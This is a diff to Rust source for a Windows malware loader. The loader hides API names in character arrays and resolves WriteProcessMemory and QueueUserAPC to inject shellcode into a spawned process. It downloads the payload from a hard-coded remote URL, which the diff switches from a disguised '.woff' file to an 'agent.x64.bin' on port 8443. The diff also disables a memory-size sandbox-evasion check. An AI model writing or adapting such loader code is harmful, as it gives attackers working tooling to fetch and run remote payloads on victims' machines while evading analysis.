@@ -118,14 +118,14 @@ fn evade() {
         GlobalMemoryStatusEx(&mut statex);
     }
 
-    let total_memory_in_gb = statex.ullTotalPhys / (1024 * 1024 * 1024);
-    if total_memory_in_gb <= 1 {
-        exit(1);
-    }
+    // let total_memory_in_gb = statex.ullTotalPhys / (1024 * 1024 * 1024);
+    // if total_memory_in_gb <= 1 {
+    //     exit(1);
+    // }
 }
 
 pub fn run_me_for_success() {
-    evade();
+    // evade();
 
     let create_process_a: [char; 14] = ['C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A'];
     let create_process_a_str: String = create_process_a.iter().collect();
@@ -145,7 +145,7 @@ pub fn run_me_for_success() {
     let pw_procmem: WriteProcessMemoryFunc = unsafe { std::mem::transmute(load_function("kernel32.dll", &procmem_str)) };
     let pw_queue_user_apc: QueueUserAPCFunc = unsafe { std::mem::transmute(load_function("kernel32.dll", &queue_user_apc_str)) };
 
-    let url = "http://10.10.14.3/transcript.woff";
+    let url = "http://192.168.15.104:8443/agent.x64.bin";
     let payload = match get_payload_from_url(url) {
         Ok(data) => data,
         Err(_e) => {
@@ -184,7 +184,7 @@ pub fn run_me_for_success() {
             exit(1);
         }
 
-        evade();
+        // evade();
 
         ResumeThread(pi.hThread);
 
